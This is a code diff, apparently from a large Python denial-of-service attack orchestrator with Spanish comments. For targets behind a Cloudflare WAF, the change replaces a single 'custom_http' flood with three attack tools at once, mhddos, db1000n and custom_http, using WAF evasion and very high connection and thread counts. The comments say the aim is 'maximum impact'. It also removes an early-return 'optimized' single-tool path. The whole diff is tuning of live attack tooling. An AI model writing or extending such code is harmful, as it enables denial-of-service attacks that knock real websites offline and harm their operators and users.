@@ -11312,13 +11312,13 @@ def recommend_tools_from_fingerprint(fingerprint: Dict = None) -> Dict:
             reasoning.append(f"CDN {cdn} detectado - configuración moderada")
     
     # ESTRATEGIA 2: WAF detectado
-    # OPTIMIZACIÓN: Una herramienta con evasión avanzada para máximo throughput
+    # SIGUIENDO LÓGICA DEL SCRIPT EXITOSO: Usar múltiples herramientas para máximo impacto
     elif waf_detected:
         if "cloudflare" in waf_name:
-            # Cloudflare WAF: custom_http con bypass avanzado
-            recommended_tools = ["custom_http"]
-            tool_count = 1
-            reasoning.append("Cloudflare WAF detectado - custom_http con bypass avanzado optimizado para máximo throughput")
+            # Cloudflare WAF: SIGUIENDO LÓGICA DEL SCRIPT EXITOSO - usar múltiples herramientas con evasión avanzada
+            recommended_tools = ["custom_http", "mhddos", "db1000n"]
+            tool_count = 3
+            reasoning.append("Cloudflare WAF detectado - usar múltiples herramientas con evasión avanzada (mhddos, db1000n) para máximo impacto")
             optimal_params = {
                 "max_connections": 30000,
                 "max_threads": 600,
@@ -13289,19 +13289,11 @@ Ejemplos:
             log_message("WARN", "⚠️ Ninguna herramienta recomendada disponible - usando fallback", force_console=True)
             recommended_tools_list = [("custom_http", None)]
         
-        # OPTIMIZACIÓN: Si solo se recomienda una herramienta, usar solo esa para máximo throughput
-        if recommended_count == 1 and recommended_tool_names and recommended_tool_names[0] == "custom_http":
-            log_message("INFO", f"🎯 [OPTIMIZATION] Modo optimizado: Usando SOLO custom_http para máximo throughput (evitando sobrecarga del sistema)", force_console=True)
-            print_color(f"🎯 Modo optimizado: Solo {recommended_tool_names[0]} para máximo throughput", Colors.GREEN, True)
-            # Solo ejecutar custom_http con parámetros optimizados
-            try:
-                deploy_custom_http_attack()
-                tools_deployed = 1
-                log_message("INFO", f"✅ [OPTIMIZATION] Ataque HTTP optimizado desplegado - esperando {expected_sessions if 'expected_sessions' in locals() else '20,000+'} sesiones", force_console=True)
-            except Exception as e:
-                log_message("ERROR", f"❌ [OPTIMIZATION] Error desplegando ataque optimizado: {e}", force_console=True)
-            # Salir temprano - no ejecutar otras herramientas
-            return
+        # SIGUIENDO LÓGICA DEL SCRIPT EXITOSO: Usar las herramientas recomendadas según el fingerprint
+        # Si se recomiendan múltiples herramientas, usarlas todas para máximo impacto
+        # Si solo se recomienda una, usar esa para máximo throughput
+        log_message("INFO", f"🎯 [DEPLOYMENT] Desplegando {recommended_count} herramienta(s) recomendada(s): {', '.join(recommended_tool_names)}", force_console=True)
+        print_color(f"🚀 Desplegando {recommended_count} herramienta(s) según recomendación del fingerprint", Colors.CYAN, True)
         
         # Limitar a la cantidad recomendada (máximo 5)
         max_recommended = min(recommended_count, 5, MAX_TOOLS_DEPLOY)
